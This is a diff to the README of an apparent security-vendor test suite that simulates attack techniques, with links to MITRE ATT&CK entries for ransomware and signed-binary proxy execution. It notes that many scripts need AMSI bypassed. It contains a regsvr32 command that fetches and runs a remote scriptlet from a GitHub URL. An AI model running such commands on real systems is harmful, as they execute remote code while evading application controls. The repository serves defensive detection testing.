@@ -11,8 +11,6 @@ The scripts can be executed on production envirenmnet.
 
 Please note that many of the scripts will not run unless AMSI is bypassed - each scripts different component of an attack chain and have to be viewed as part of a bigger picture
 
-**Example:**
-
 ## Ransomware techniques:
 Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources.
 https://attack.mitre.org/techniques/T1486/
@@ -112,4 +110,5 @@ https://attack.mitre.org/techniques/T1218/011/
 
 https://attack.mitre.org/techniques/T1218/010/
 
-`PS>regsvr32.exe /u /s /i:https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/calc.txt scrobj.dll`
+`PS> regsvr32.exe /u /s /i:https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/calc.txt scrobj.dll`
+
